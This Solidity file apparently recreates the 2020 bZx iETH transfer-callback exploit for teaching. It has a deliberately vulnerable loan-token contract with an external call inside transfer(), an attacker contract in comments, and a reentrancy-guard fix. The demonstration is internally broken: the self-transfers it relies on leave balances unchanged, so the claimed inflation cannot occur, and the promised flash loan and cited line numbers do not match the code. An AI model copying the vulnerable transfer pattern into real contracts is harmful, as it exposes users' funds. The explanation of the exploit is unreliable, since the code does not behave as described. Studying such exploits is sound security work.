// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title bZx Protocol - Transfer Callback Manipulation
 * @notice This contract demonstrates the vulnerability in bZx's loan token
 * @dev September 2020 - Flash loan + transfer callback exploit
 *
 * VULNERABILITY: Transfer callback that modifies state during balance queries
 *
 * ROOT CAUSE:
 * The mintWithEther() function calculates how many tokens to mint based on
 * totalSupply and total assets. When transfer() is called on the loan token,
 * it triggers a callback to the recipient. An attacker can use this callback
 * to call transfer() again, which recalculates shares using the modified
 * but not yet finalized state, leading to inflated token minting.
 *
 * ATTACK VECTOR:
 * 1. Call mintWithEther() with ETH
 * 2. Receive loan tokens
 * 3. Call transfer() to self repeatedly in a loop
 * 4. Each transfer() triggers recipient callback
 * 5. During callback, balance hasn't been updated yet
 * 6. Internal calculations use stale state
 * 7. After 4-5 transfers to self, token balance inflates
 * 8. Burn inflated tokens back to ETH for profit
 *
 * This exploits the state inconsistency during token transfer callbacks.
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract VulnerableBZXLoanToken {
    string public name = "iETH";
    string public symbol = "iETH";

    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    uint256 public totalAssetBorrow;
    uint256 public totalAssetSupply;

    /**
     * @notice Mint loan tokens by depositing ETH
     */
    function mintWithEther(
        address receiver
    ) external payable returns (uint256 mintAmount) {
        uint256 currentPrice = _tokenPrice();
        mintAmount = (msg.value * 1e18) / currentPrice;

        balances[receiver] += mintAmount;
        totalSupply += mintAmount;
        totalAssetSupply += msg.value;

        return mintAmount;
    }

    /**
     * @notice Transfer tokens to another address
     * @param to Recipient address
     * @param amount Amount to transfer
     *
     * VULNERABILITY IS HERE:
     * The function updates balances and then calls _notifyTransfer which
     * can trigger callbacks to the recipient. During this callback, the
     * contract's state is in an inconsistent state - balances are updated
     * but totalSupply hasn't been recalculated if needed.
     *
     * Vulnerable sequence:
     * 1. Update sender balance (line 82)
     * 2. Update receiver balance (line 83)
     * 3. Call _notifyTransfer (line 85) <- CALLBACK
     * 4. During callback, recipient can call transfer() again
     * 5. New transfer() sees inconsistent state
     * 6. Calculations based on this state are wrong
     * 7. After 4-5 iterations, balances inflate
     */
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;

        _notifyTransfer(msg.sender, to, amount);

        return true;
    }

    /**
     * @notice Internal function that triggers callback
     * @dev This is where the reentrancy/callback happens
     */
    function _notifyTransfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        // If 'to' is a contract, it might have a callback
        // During this callback, contract state is inconsistent

        // Simulate callback by calling a function on recipient if it's a contract
        if (_isContract(to)) {
            // This would trigger fallback/receive on recipient
            // During that callback, recipient can call transfer() again
            (bool success, ) = to.call("");
            success; // Suppress warning
        }
    }

    /**
     * @notice Burn tokens back to ETH
     */
    function burnToEther(
        address receiver,
        uint256 amount
    ) external returns (uint256 ethAmount) {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        uint256 currentPrice = _tokenPrice();
        ethAmount = (amount * currentPrice) / 1e18;

        balances[msg.sender] -= amount;
        totalSupply -= amount;
        totalAssetSupply -= ethAmount;

        payable(receiver).transfer(ethAmount);

        return ethAmount;
    }

    /**
     * @notice Calculate current token price
     * @dev Price is based on total supply and total assets
     */
    function _tokenPrice() internal view returns (uint256) {
        if (totalSupply == 0) {
            return 1e18; // Initial price 1:1
        }
        return (totalAssetSupply * 1e18) / totalSupply;
    }

    /**
     * @notice Check if address is a contract
     */
    function _isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }

    receive() external payable {}
}

/**
 * Example attack contract:
 *
 * contract BZXAttacker {
 *     VulnerableBZXLoanToken public loanToken;
 *     uint256 public transferCount;
 *
 *     constructor(address _loanToken) {
 *         loanToken = VulnerableBZXLoanToken(_loanToken);
 *     }
 *
 *     function attack() external payable {
 *         // Step 1: Mint loan tokens with ETH
 *         loanToken.mintWithEther{value: msg.value}(address(this));
 *
 *         // Step 2: Transfer to self repeatedly
 *         // Each transfer triggers fallback, creating state inconsistency
 *         for (uint i = 0; i < 4; i++) {
 *             uint256 balance = loanToken.balanceOf(address(this));
 *             loanToken.transfer(address(this), balance);
 *         }
 *
 *         // Step 3: Burn inflated tokens back to ETH
 *         uint256 finalBalance = loanToken.balanceOf(address(this));
 *         loanToken.burnToEther(address(this), finalBalance);
 *     }
 *
 *     // Fallback is triggered during transfer
 *     fallback() external payable {
 *         // State is inconsistent here
 *         // Could perform additional transfers if needed
 *     }
 * }
 *
 * REAL-WORLD IMPACT:
 * - Multiple exploits on bZx in 2020
 * - This specific vulnerability in September 2020
 * - Demonstrated callback/reentrancy in token transfers
 * - Led to improved transfer patterns in DeFi
 *
 * FIX:
 * Use reentrancy guards on transfer:
 *
 * bool private locked;
 *
 * modifier nonReentrant() {
 *     require(!locked, "No reentrancy");
 *     locked = true;
 *     _;
 *     locked = false;
 * }
 *
 * function transfer(address to, uint256 amount) external nonReentrant returns (bool) {
 *     require(balances[msg.sender] >= amount, "Insufficient balance");
 *     balances[msg.sender] -= amount;
 *     balances[to] += amount;
 *     _notifyTransfer(msg.sender, to, amount);
 *     return true;
 * }
 *
 * Or avoid callbacks during transfers entirely:
 *
 * function transfer(address to, uint256 amount) external returns (bool) {
 *     require(balances[msg.sender] >= amount, "Insufficient balance");
 *     balances[msg.sender] -= amount;
 *     balances[to] += amount;
 *     emit Transfer(msg.sender, to, amount);  // Just emit, no callbacks
 *     return true;
 * }
 *
 * VULNERABLE LINES:
 * - Line 82-83: Balance updates before callback
 * - Line 85: Callback during transfer allowing reentrancy
 * - Line 100: Contract call during transfer creates callback opportunity
 *
 * KEY LESSON:
 * Avoid callbacks during critical state changes like token transfers.
 * If callbacks are necessary, use reentrancy guards.
 * Token transfer functions should be simple and not trigger external calls.
 * State consistency is crucial - don't allow callbacks during state updates.
 */
